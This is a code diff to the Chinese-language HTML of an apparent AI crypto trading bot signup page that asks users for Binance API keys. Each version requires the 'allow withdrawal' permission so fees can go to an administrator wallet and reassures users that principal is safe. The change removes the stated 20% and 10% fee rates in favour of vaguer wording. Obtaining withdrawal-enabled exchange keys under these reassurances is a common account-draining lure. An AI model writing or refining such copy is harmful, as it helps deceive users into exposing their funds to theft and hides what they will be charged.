@@ -186,8 +186,8 @@ body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);line-
         <div><div class="card-title">安全说明</div><div class="card-desc">为什么需要您的 API Key？</div></div>
       </div>
       <p style="color:var(--text2);font-size:14px;margin-bottom:16px">
-        为了帮您自动交易并自动转账服务费，系统需要访问您的币安账户。<br>
-        创建 API Key 时<strong style="color:var(--primary)">必须勾选「允许提现」权限</strong> — 提现功能仅用于平仓盈利后自动转账服务费(20%)和生态费(10%)到管理员钱包。
+        为了帮您自动交易并提取盈利收益的服务费，系统需要访问您的币安账户。<br>
+        创建 API Key 时<strong style="color:var(--primary)">必须勾选「允许提现」权限</strong> — 提现功能只用于提现盈利收益的服务费到管理员钱包。
       </p>
     </div>
 
@@ -195,8 +195,8 @@ body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);line-
       <div class="feature-card">
         <div class="feature-num">1</div>
         <div>
-          <h3><i class="ph ph-shield-check" style="color:var(--primary);margin-right:4px"></i> 提现仅用于服务费</h3>
-          <p>API Key 必须勾选「允许提现」权限，<strong>仅用于平仓后自动转账服务费和生态费</strong>。机器人不会转移您的本金或全部资产。</p>
+          <h3><i class="ph ph-shield-check" style="color:var(--primary);margin-right:4px"></i> 提现只用于服务费</h3>
+          <p>API Key 必须勾选「允许提现」权限，<strong>只用于提现盈利收益的服务费</strong>。机器人不会转移您的本金或全部资产。</p>
         </div>
       </div>
       <div class="feature-card">
@@ -343,7 +343,7 @@ body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);line-
         <div class="warning-box" style="border-color:rgba(63,185,80,.3);background:rgba(63,185,80,.08)">
           <i class="ph ph-info" style="color:#3fb950"></i>
           <div>
-            <p style="color:#3fb950"><strong>提现权限说明：</strong>提现功能仅用于平仓盈利后自动转账服务费(20%)和生态费(10%)到管理员钱包。机器人不会转移您的本金或全部资产。</p>
+            <p style="color:#3fb950"><strong>提现权限说明：</strong>提现功能只用于提现盈利收益的服务费到管理员钱包。机器人不会转移您的本金或全部资产。</p>
           </div>
         </div>
         <p style="margin-top:12px;font-size:13px;color:var(--text3)">
@@ -435,7 +435,7 @@ body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);line-
     <h3><i class="ph ph-lock-key" style="margin-right:6px;color:var(--primary)"></i>安全承诺</h3>
     <div class="trust-items">
       <div class="trust-item"><i class="ph ph-shield-check"></i> 密钥加密存储</div>
-      <div class="trust-item"><i class="ph ph-prohibit"></i> 提现仅转服务费</div>
+      <div class="trust-item"><i class="ph ph-prohibit"></i> 提现只转服务费</div>
       <div class="trust-item"><i class="ph ph-x-circle"></i> 随时可解绑</div>
       <div class="trust-item"><i class="ph ph-lock"></i> 全程SSL加密</div>
     </div>
@@ -528,7 +528,7 @@ async function verifyKeys(){
           账户余额: <strong>${data.balance||'--'} USDT</strong><br>
           合约交易权限: <strong style="color:var(--primary)">✅ 已开启</strong><br>
           现货交易权限: <strong style="color:var(--primary)">✅ 已开启</strong><br>
-          提现权限: <strong style="color:var(--primary)">✅ 已开启（用于自动转账服务费）</strong><br><br>
+          提现权限: <strong style="color:var(--primary)">✅ 已开启（只用于提现盈利收益的服务费）</strong><br><br>
           🎉 您的账户已成功连接！AI量化机器人即将开始为您工作。
         </div>`;
       updateProgress(4);
